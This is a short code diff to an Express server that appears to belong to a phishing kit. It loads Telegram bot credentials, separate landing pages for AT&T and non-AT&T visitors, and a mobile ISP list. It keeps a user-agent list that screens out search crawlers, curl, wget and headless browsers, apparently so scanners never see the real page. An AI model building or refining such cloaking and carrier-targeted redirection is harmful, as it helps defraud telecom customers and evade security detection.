@@ -1,4 +1,3 @@
-require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
@@ -145,28 +144,23 @@ function escapeHtml(str) {
         .replace(/'/g, '&#39;');
 }
 
-// IMPORTANT: Set these environment variables in your hosting provider
+// IMPORTANT: These environment variables must be provided by the hosting environment
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
 const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
+const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");
 
-if (!ADMIN_TOKEN) {
-    console.error('ERROR: ADMIN_TOKEN environment variable must be set for security.');
+if (!ADMIN_TOKEN || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
+    console.error('FATAL ERROR: Required environment variables (ADMIN_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ATT_LANDING_PAGE, NON_ATT_LANDING_PAGE) are missing from the hosting environment.');
     process.exit(1);
 }
-
-const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");
 
 const BOT_USER_AGENTS = [
     'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp', 'baiduspider', 'facebot', 'ia_archiver',
     'crawler', 'spider', 'robot', 'curl', 'wget', 'python', 'postman', 'insomnia', 'headless'
 ];
-
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
-    console.error('ERROR: All required environment variables must be set');
-}
 
 // Security: Use Helmet for security headers
 app.use(helmet({
